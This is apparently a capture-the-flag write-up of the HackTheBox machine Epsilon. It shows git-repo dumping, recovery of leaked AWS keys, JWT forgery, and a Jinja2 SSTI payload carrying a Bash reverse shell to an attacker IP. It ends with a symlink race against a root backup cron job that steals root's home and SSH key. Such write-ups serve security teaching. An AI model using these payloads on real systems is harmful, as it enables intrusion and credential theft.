---
title: HTB: Epsilon
url: https://0xdf.gitlab.io/2022/03/10/htb-epsilon.html
date: 2022-03-10T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-epsilon, nmap, feroxbuster, git, gitdumper, source-code, flask, python, aws, awscli, aws-lambda, htb-gobox, htb-bolt, htb-bucket, jwt, ssti, burp, burp-repeater, pspy, timing-attack, cron
---

![Epsilon](https://0xdfimages.gitlab.io/img/epsilon-cover.png)

Epsilon originally released in the 2021 HTB University CTF, but later released on HTB for others to play. In this box, I’ll start by finding an exposed git repo on the webserver, and use that to find source code for the site, including the AWS keys. Those keys get access to lambda functions which contain a secret that is reused as the secret for the signing of JWT tokens on the site. With that secret, I’ll get access to the site and abuse a server-side template injection to get execution and an initial shell. To escalate to root, there’s a backup script that is creating tar archives of the webserver which I can abuse to get a copy of root’s home directory, including the flag and an SSH key for shell access.

## Box Info

| Name | [Epsilon](https://hackthebox.com/machines/epsilon)  [Epsilon](https://hackthebox.com/machines/epsilon) [Play on HackTheBox](https://hackthebox.com/machines/epsilon) |
| --- | --- |
| Release Date | [07 Feb 2022](https://twitter.com/hackthebox_eu/status/1491080394342600706) |
| Retire Date | 07 Feb 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP hosted by Apache (80), and HTTP hosted by Python (5000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-09 17:58 UTC
Nmap scan report for 10.10.11.134
Host is up (0.062s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
oxdf@hacky$ nmap -p 22,80,5000 -sCV -oA scans/nmap-tcpscripts 10.10.11.134
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-09 18:07 UTC
Nmap scan report for 10.10.11.134
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

`nmap` also identified a Git repo on the port 80 site, which I’ll definitely want to check out.

### Website - TCP 5000

#### Site

The page is for a costume shop:

![image-20220309131735079](https://0xdfimages.gitlab.io/img/image-20220309131735079.png)

Some basic guesses like “admin” / “admin” don’t work, and simple SQL injections don’t show anything useful either.

#### Tech Stack

The HTTP headers show what `nmap` already identified, that the site is hosted using Python:

```

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3550
Server: Werkzeug/2.0.2 Python/3.8.10
Date: Wed, 09 Mar 2022 18:22:20 GMT

```

#### Directory Brute Force

I’ll run `feroxbuster` here with no extensions (because it’s Python):

```

oxdf@hacky$ feroxbuster -u http://10.10.11.134:5000

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.134:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        4l       24w      208c http://10.10.11.134:5000/home => http://10.10.11.134:5000/
302      GET        4l       24w      208c http://10.10.11.134:5000/order => http://10.10.11.134:5000/
200      GET      234l      454w     4288c http://10.10.11.134:5000/track
[####################] - 1m     29999/29999   0s      found:3       errors:0      
[####################] - 1m     29999/29999   487/s   http://10.10.11.134:5000 

```

`/home` and `/order` both redirect to the root page which gives the login form. This makes sense for a site that wants auth to access the other pages.

`/track` returns 200 OK.

#### /track

`/track` presents a page for tracking orders, including welcoming me as admin:

![image-20220309132355405](https://0xdfimages.gitlab.io/img/image-20220309132355405.png)

Every link on this page (including the “Track” button which sends a post to `/track`) results in a 302 redirect back to the root login form. I suspect this page wasn’t meant to be accessible.

### Website - TCP 80

#### Site

Trying to visit this site just returns a standard Apache 403 Forbidden page:

![image-20220309131528209](https://0xdfimages.gitlab.io/img/image-20220309131528209.png)

#### Tech Stack

The response headers don’t give any additional information:

```

HTTP/1.1 403 Forbidden
Date: Wed, 09 Mar 2022 18:19:09 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 277
Connection: close
Content-Type: text/html; charset=iso-8859-1

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything other than the standard Apache `server-status` page, which returns 403:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.134

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.134
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c http://10.10.11.134/server-status
[####################] - 18s    29999/29999   0s      found:1       errors:0      
[####################] - 17s    29999/29999   1726/s  http://10.10.11.134

```

### Git Repo

#### Dump

`nmap` pointed out that there was a `.git` folder on port 80’s webserver. I’ll use [GitTools](https://github.com/internetwache/GitTools) `gitdumper.sh` to pull the repo:

```

oxdf@hacky$ /opt/GitTools/Dumper/gitdumper.sh http://10.10.11.134/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#                                           
# Developed and maintained by @gehaxelt from @internetwache
#                                              
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########                   

[*] Destination folder does not exist
[+] Creating ./.git/                   
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description                        
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
...[snip]...
[+] Downloaded: objects/8d/3b52e153c7d5380b183bbbb51f5d4020944630
[+] Downloaded: objects/fe/d7ab97cf361914f688f0e4f2d3adfafd1d7dca
[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34
oxdf@hacky$ ls -la
total 12
drwxrwx--- 1 root vboxsf 4096 Mar  9 19:18 .
drwxrwx--- 1 root vboxsf 4096 Mar  9 19:16 ..
drwxrwx--- 1 root vboxsf 4096 Mar  9 19:18 .git

```

It creates a `.git` directory, which is how Git repos are stored on disk.

#### Recover Source Code

If I run `git status`, it shows two deleted files:

```

oxdf@hacky$ git status 
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    server.py
        deleted:    track_api_CR_148.py

no changes added to commit (use "git add" and/or "git commit -a")

```

That’s because the last commit had those files, and now they are not present, so `git` thinks they must have been deleted. `git reset --hard` will put things back as they were at the last commit:

```

oxdf@hacky$ git reset --hard
HEAD is now at c622771 Fixed Typo
oxdf@hacky$ git status 
On branch master
nothing to commit, working tree clean
oxdf@hacky$ ls -l
total 8
-rw-rw-r-- 1 oxdf oxdf 1670 Mar  9 19:23 server.py
-rw-rw-r-- 1 oxdf oxdf 1099 Mar  9 19:23 track_api_CR_148.py

```

#### Source Analysis - server.py

`server.py` is a Flask application that defines four routes, `/`, `/home`, `/track`, and `/order`. All by `/` call `verify_jwt` with the provided cookie and redirect to `/` if it doesn’t return true. For example:

```

@app.route("/home")
def home():
        if verify_jwt(request.cookies.get('auth'),secret):
                return render_template('home.html')
        else:
                return redirect('/',code=302)

```

`verify_jet` uses the [PyJWT library](https://pyjwt.readthedocs.io/en/stable/) with a secret that is obfuscated in this code:

```

secret = '<secret_key>'

def verify_jwt(token,key):
        try:
                username=jwt.decode(token,key,algorithms=['HS256',])['username']
                if username:
                        return True
                else:
                        return False
        except:
                return False

```

The login functions seems to suggest that username “admin” with password “admin” should work, but as it didn’t, something must have changed with this code as compared to the live site:

```

@app.route("/", methods=["GET","POST"])
def index():
        if request.method=="POST":
                if request.form['username']=="admin" and request.form['password']=="admin":
                        res = make_response()
                        username=request.form['username']
                        token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
                        res.set_cookie("auth",token)
                        res.headers['location']='/home'
                        return res,302
                else:
                        return render_template('index.html')
        else:
                return render_template('index.html')

```

The `/track` route also doesn’t require auth for a GET, but does for a POST:

```

@app.route("/track",methods=["GET","POST"])
def track():
        if request.method=="POST":
                if verify_jwt(request.cookies.get('auth'),secret):
                        return render_template('track.html',message=True)
                else:
                        return redirect('/',code=302)
        else:
                return render_template('track.html')

```

`/order` seems to have a server-side template injection (SSTI) vulnerability:

```

@app.route('/order',methods=["GET","POST"])
def order():
        if verify_jwt(request.cookies.get('auth'),secret):
                if request.method=="POST":
                        costume=request.form["costume"]
                        message = '''
                        Your order of "{}" has been placed successfully.
                        '''.format(costume)
                        tmpl=render_template_string(message,costume=costume)
                        return render_template('order.html',message=tmpl)
                else:
                        return render_template('order.html')
        else:
                return redirect('/',code=302)

```

It is taking user input (the `costume` field from the input form), and passing that into `render_template_string`, which is a dangerous function. If I get authenticated access to the site, I’ll want to explore that further.

#### Source Analysis - track\_api\_CR\_148.py

The other file is for interacting with an AWS instance:

```

import io
import os
from zipfile import ZipFile
from boto3.session import Session

session = Session(
    aws_access_key_id='<aws_access_key_id>',
    aws_secret_access_key='<aws_secret_access_key>',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilon.htb')
aws_lambda = session.client('lambda')

def files_to_zip(path):
    for root, dirs, files in os.walk(path):
        for f in files:
            full_path = os.path.join(root, f)
            archive_name = full_path[len(path) + len(os.sep):]
            yield full_path, archive_name

def make_zip_file_bytes(path):
    buf = io.BytesIO()
    with ZipFile(buf, 'w') as z:
        for full_path, archive_name in files_to_zip(path=path):
            z.write(full_path, archive_name)
    return buf.getvalue()

def update_lambda(lambda_name, lambda_code_path):
    if not os.path.isdir(lambda_code_path):
        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))
    aws_lambda.update_function_code(
        FunctionName=lambda_name,
        ZipFile=make_zip_file_bytes(path=lambda_code_path))

```

Specifically, the `update_lambda` function seems to modify AWS serverless functions, called Lambda.

The key information is blanked out. I will note the `endpoint_url`, `http://cloud.epsilon.htb`, and add that to my `/etc/hosts` file.

#### Past Commits

`git log` shows there are four commits:

```

oxdf@hacky$ git log --oneline 
c622771 (HEAD -> master) Fixed Typo
b10dd06 Adding Costume Site
c514416 Updating Tracking API
7cf92a7 Adding Tracking API Module

```

`git diff [a] [b]` will show what changed between two commits. It reads better if the older commit is a. So for example, the last commit that “Fixed Typo” seems to have corrected an issue in the url:

```

oxdf@hacky$ git diff b10dd06 c622771
diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 545f6fe..8d3b52e 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -8,8 +8,8 @@ session = Session(
     aws_access_key_id='<aws_access_key_id>',
     aws_secret_access_key='<aws_secret_access_key>',
     region_name='us-east-1',
-    endpoint_url='http://cloud.epsilong.htb')
-aws_lambda = session.client('lambda')    
+    endpoint_url='http://cloud.epsilon.htb')
+aws_lambda = session.client('lambda')

```

Going back another commit (`git diff c514416 b10dd06`), this just adds the costume site just like it is in the source I already looked at.

The next commit back, it looks like they removed the AWS creds:

```

oxdf@hacky$ git diff 7cf92a7 c514416
diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index fed7ab9..545f6fe 100644
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,8 +5,8 @@ from boto3.session import Session

 session = Session(
-    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
-    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    aws_access_key_id='<aws_access_key_id>',
+    aws_secret_access_key='<aws_secret_access_key>',
     region_name='us-east-1',
     endpoint_url='http://cloud.epsilong.htb')
 aws_lambda = session.client('lambda') 

```

## Shell as tom

### Lambda

#### Configure awscli

I’ve exploited AWS (and AWS-like interfaces like LocalStack) before on HTB (in [Gobox](/2021/08/30/htb-gobox.html#enumeration) and [Bucket](/2021/04/24/htb-bucket.html#aws-overview)). This is the first time I’ve shown interaction with Lambda. I’ll use the `aws` command line too (`apt install awscli`) to connect to this instance.

First I need to configure with the secrets:

```

oxdf@hacky$ aws configure
AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [None]: us-east-1
Default output format [None]: 

```

#### Explore Lambda

Given the references above to Lambda, I’ll start there. Running `aws help` shows that `lambda` is one of the subcommands for `aws`. For each `aws` command, I’ll need to give it `--endpoint-url=http://cloud.epsilon.htb` so that it talks to the HTB machine and not to actual AWS.

`aws lambda help` gives a list of commands for interacting with Lambda. `list-functions` seems like a good place to start:

```

oxdf@hacky$ aws lambda list-functions --endpoint-url=http://cloud.epsilon.htb 
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2022-03-09T18:40:07.722+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "8dc3e57d-61f2-45c6-af28-a45947aca34f",
            "State": "Active",
            "LastUpdateStatus": "Successful"
        }
    ]
}

```

There’s only one function, `costume_shop_v1`. To get the code, I need the location, which I can find with `get-function`:

```

oxdf@hacky$ aws lambda get-function --function-name=costume_shop_v1 --endpoint-url=http://cloud.epsilon.htb 
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2022-03-09T18:40:07.722+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "8dc3e57d-61f2-45c6-af28-a45947aca34f",
        "State": "Active",
        "LastUpdateStatus": "Successful"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}

```

This output looks similar to the first output, but it has `Code`, which has the location of the source. I’ll download that:

```

oxdf@hacky$ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
--2022-03-09 20:00:56--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolving cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134
Connecting to cloud.epsilon.htb (cloud.epsilon.htb)|10.10.11.134|:80... connected.
HTTP request sent, awaiting response... 200 
Length: 478 [application/zip]
Saving to: ‘code’

code                                                 100%[=====================================================================================================================>]     478  --.-KB/s    in 0s      

2022-03-09 20:00:57 (60.4 MB/s) - ‘code’ saved [478/478]

oxdf@hacky$ file code 
code: Zip archive data, at least v2.0 to extract

```

It comes as a Zip Archive, which contains `lambda_function.py`:

```

oxdf@hacky$ unzip code
Archive:  code
  inflating: lambda_function.py  

```

The code itself isn’t that interesting:

```

import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }

```

It seems like perhaps the function will someday be used in the tracking for the application, but for now, it doesn’t do much. It does have a `secret` variable though.

### Access Costume Site

I can guess (hope) that perhaps the same secret used in this lambda function is used to sign the JWT for the site. I haven’t been able to get a cookie to verify it, so I’ll just forge one and see if it’s accepted. What’s important about the cookie is that it contain a `username` field.

```

oxdf@hacky$ python
Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import jwt
>>> secret = "RrXCv`mrNe!K!4+5`wYq"
>>> jwt.encode({"username":"0xdf"}, secret, algorithm='HS256')
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjB4ZGYifQ.0kQYuCxPdN6bYT66kYg3lF-fjFRU9YvI30hNN4t77RE'

```

I’ll also note in the code that the token was taken from the cookie named `auth`. I’ll add that cookie in the Firefox dev tools:

[![image-20220309151115326](https://0xdfimages.gitlab.io/img/image-20220309151115326.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220309151115326.png)

On visiting `/home`, it doesn’t redirect:

![image-20220309151137447](https://0xdfimages.gitlab.io/img/image-20220309151137447.png)

### SSTI

#### Find

I noted during the source analysis that there could be an SSTI in `/order`. Visiting that page, there’s a form:

![image-20220309151229557](https://0xdfimages.gitlab.io/img/image-20220309151229557.png)

The costume field is a drop down selection:

![image-20220309151247211](https://0xdfimages.gitlab.io/img/image-20220309151247211.png)

On submitting, the page updates to show a message under the form:

![image-20220309151320075](https://0xdfimages.gitlab.io/img/image-20220309151320075.png)

The post request looks like:

```

POST /order HTTP/1.1
Host: 10.10.11.134:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://10.10.11.134:5000
Connection: close
Referer: http://10.10.11.134:5000/order
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjB4ZGYifQ.0kQYuCxPdN6bYT66kYg3lF-fjFRU9YvI30hNN4t77RE
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

costume=mask&q=1&addr=test

```

#### POC

I’ll send that POST to Burp Repeater and try a simple SSTI payload. It worked:

[![image-20220309151534646](https://0xdfimages.gitlab.io/img/image-20220309151534646.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220309151534646.png)

I recently went more in depth looking at [SSTI in Bolt](/2022/02/19/htb-bolt.html#ssti) (as well as a Beyond Root [video](https://www.youtube.com/watch?v=7o1J8vHdlYc) looking at how various payloads work). For Epsilon, I’ll use:

```

{{ namespace.__init__.__globals__.os.popen('id').read() }}

```

It works nicely as well:

[![image-20220309151753900](https://0xdfimages.gitlab.io/img/image-20220309151753900.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220309151753900.png)

#### Shell

I’ll update the payload to:

```

costume={{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261"').read() }}&q=1&addr=test

```

I’ll need to URL encode the `&` character of the POST request will treat it as a break and a new parameter. I’ll use a Bash reverse shell, with `bash -c ''` to make sure it’s running in the Bash context (see the end of my deep dive [video](https://www.youtube.com/watch?v=OjkVep2EIlw) on this reverse shell for details).

On submitting in Repeater, it hangs. At my listening `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.134 38950
bash: cannot set terminal process group (949): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ 

```

I’ll upgrade my shell:

```

tom@epsilon:/var/www/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tom@epsilon:/var/www/app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo;fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
tom@epsilon:/var/www/app$

```

And grab `user.txt`:

```

tom@epsilon:~$ cat user.txt
9ae137b0************************

```

## Shell as root

### Enumeration

There isn’t much else in tom’s home directory. There is an interesting but empty directory at `/opt/backups`.

I’ll upload [pspy](https://github.com/DominicBreuker/pspy):

```

tom@epsilon:/dev/shm$ wget 10.10.14.8/pspy64
--2022-03-09 20:40:37--  http://10.10.14.8/pspy64
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  3.53MB/s    in 0.8s    

2022-03-09 20:40:38 (3.53 MB/s) - ‘pspy64’ saved [3078592/3078592]
tom@epsilon:/dev/shm$ chmod +x pspy64

```

On running, it seems to find `/usr/bin/backup.sh` running every minute:

```

pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                                                                            
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                  
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                  
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                  
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                  
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                                                                             
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                   
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                    
                   ░           ░ ░                                                                       
                               ░ ░                                                                       
                                                                                                                                                                                                                   
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursi
ve) | [] (non-recursive)
Draining file system events due to startup...
done
...[snip]...
2022/03/09 20:42:01 CMD: UID=0    PID=3754   | /usr/sbin/CRON -f 
2022/03/09 20:42:01 CMD: UID=0    PID=3755   | /bin/sh -c /usr/bin/backup.sh 
2022/03/09 20:42:01 CMD: UID=0    PID=3756   | /bin/bash /usr/bin/backup.sh 
2022/03/09 20:42:01 CMD: UID=0    PID=3759   | /usr/bin/tar -cvf /opt/backups/462504870.tar /var/www/app/ 
2022/03/09 20:42:01 CMD: UID=0    PID=3761   | /bin/bash /usr/bin/backup.sh 
2022/03/09 20:42:01 CMD: UID=0    PID=3760   | sha1sum /opt/backups/462504870.tar 
2022/03/09 20:42:01 CMD: UID=0    PID=3762   | sleep 5 
2022/03/09 20:42:06 CMD: UID=0    PID=3763   | 
2022/03/09 20:42:06 CMD: UID=0    PID=3764   | /usr/bin/tar -chvf /var/backups/web_backups/477319990.tar /opt/backups/checksum /opt/backups/462504870.tar 
2022/03/09 20:42:06 CMD: UID=0    PID=3765   | 
...[snip]...

```

Just from the PSpy output it looks like the script is running `tar`, taking a SHA1 hash, sleeping, checking the checksum, and then doing something else.

### backup.sh

Because it’s a simple shell script, I can read the contents as text:

```

#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*

```

`date +%N` returns the nanosecond porton of the current time. This effectively gives a random number.

The script:
- Removes all files and folders in `/opt/backups`.
- Creates a Tar archive called `/opt/backups/[date str].tar` with the contents of `/var/www/app`.
- Creates `/opt/backups/checksum` which contains the SHA1 hash of the new `.tar` file.
- Sleeps for five seconds
- Create a new Tar archive in `/var/backups/web_backups` containing the first archive and the checksum file.
- Remove all files and folders from `/opt/backups`.

The second `tar` command adds `-h` to the parameters. From the [man page](https://man7.org/linux/man-pages/man1/tar.1.html):

> ```

> -h, --dereference
> 	Follow symlinks; archive and dump the files they point to.
>
> ```

### Exploit

To exploit this, I’m going to use a Bash loop to watch for the `checksum` file, and replace it with a symbolic link to `/root`:

```

while :; do 
	if test -f checksum; then 
		rm -f checksum; 
		ln -s /root checksum; 
		echo "Replaced checksum"; 
		sleep 5; 
		echo "Backup probably done now";
		break;
	fi; 
	sleep 1; 
done

```

This will loop ever second, each time checking for the existence of `checksum` in the current directory. When it does exist, it will remove it, and replace it with a symbolic link. Then it prints, sleeps, and prints again, and exits the loop. I’ll run this on Epsilon:

```

tom@epsilon:/opt/backups$ while :; do if test -f checksum; then rm -f checksum; ln -s /root checksum; echo "Replaced checksum"; sleep 5; echo "Backup probably done now"; break; fi; sleep 1; done
Replaced checksum
Backup probably done now

```

The new backup is significantly larger than the others:

```

tom@epsilon:/var/backups/web_backups$ ls -l
total 159848
-rw-r--r-- 1 root root  1003520 Mar  9 21:00 313767730.tar
-rw-r--r-- 1 root root  1003520 Mar  9 21:01 333334780.tar
-rw-r--r-- 1 root root  1003520 Mar  9 21:02 358658250.tar
-rw-r--r-- 1 root root  1003520 Mar  9 21:03 386669510.tar
-rw-r--r-- 1 root root 80332800 Mar  9 21:04 498453770.tar

```

I’ll copy it to `/dev/shm` and and extract it:

```

tom@epsilon:/var/backups/web_backups$ cp 645074490.tar /dev/shm/
tom@epsilon:/var/backups/web_backups$ cd /dev/shm/
tom@epsilon:/dev/shm$ tar xf 498453770.tar 
tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted
tar: Exiting with failure status due to previous errors

```

There are a couple errors, but over all it works. There’s an `opt` directory:

```

tom@epsilon:/dev/shm$ ls
498453770.tar  multipath  opt
tom@epsilon:/dev/shm$ cd opt/backups       
tom@epsilon:/dev/shm/opt/backups$
tom@epsilon:/dev/shm/opt/backups$ ls -l
total 972
-rw-r--r-- 1 tom tom 993280 Mar  9 21:07 637358080.tar
drwx------ 9 tom tom    300 Dec 20 11:06 checksum

```

`checksum` is a directory, not a file. It looks like a home directory:

```

tom@epsilon:/dev/shm/opt/backups$ ls checksum/
docker-compose.yml  lambda.sh  root.txt  src

```

I can read `root.txt` at this point:

```

tom@epsilon:/dev/shm/opt/backups/checksum$ cat root.txt
05460984************************

```

I can also grab root’s SSH keys:

```

tom@epsilon:/dev/shm/opt/backups/checksum/.ssh$ ls -l
total 12
-rw------- 1 tom tom  566 Dec  1 13:08 authorized_keys
-rw------- 1 tom tom 2602 Dec  1 13:07 id_rsa
-rw-r--r-- 1 tom tom  566 Dec  1 13:07 id_rsa.pub

```

With that `id_rsa` on my system, I can connect over SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/epsilon-root root@10.10.11.134
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
...[snip]...
root@epsilon:~#

```